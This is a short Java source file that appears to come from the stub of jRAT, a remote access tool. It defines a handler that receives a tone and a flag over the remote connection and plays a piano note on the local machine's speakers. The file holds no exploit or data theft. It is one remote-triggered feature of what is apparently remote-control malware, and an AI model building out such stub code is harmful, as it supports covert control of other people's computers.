package se.jrat.stub.packets.incoming;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;

import se.jrat.stub.Connection;
import se.jrat.stub.Note;


public class Packet66PianoNote extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int tone = con.readInt();
		boolean buzz = con.readBoolean();
		AudioFormat af = new AudioFormat(Note.SAMPLE_RATE, 8, 1, true, true);
		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
		dl.open(af, Note.SAMPLE_RATE);
		dl.start();
		Note.play(dl, Note.values()[tone], 500);

		if (buzz) {
			Note.play(dl, Note.REST, 500);
		}
		dl.drain();
		dl.close();
	}

}
